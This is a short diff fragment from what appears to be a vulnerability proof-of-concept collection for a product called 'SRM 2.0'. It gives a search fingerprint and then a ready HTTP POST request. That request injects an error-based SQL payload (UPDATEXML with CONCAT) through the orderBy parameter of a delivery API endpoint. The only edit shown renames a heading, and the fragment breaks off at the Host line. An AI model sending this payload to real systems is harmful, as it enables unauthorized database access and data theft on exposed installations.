@@ -6,7 +6,7 @@
 title=="SRM 2.0"
 ```
 
-## poc
+## POC
 ```java
 POST /adpweb/api/srm/delivery/quickReceiptDetail?orderBy=%28UPDATEXML%288058%2CCONCAT%280x2e%2C0x71707a7671%2C%28SELECT+%28ELT%288058%3D8058%2C1%29%29%29%2C0x71766a7671%29%2C3521%29%29 HTTP/1.1
 Host: 
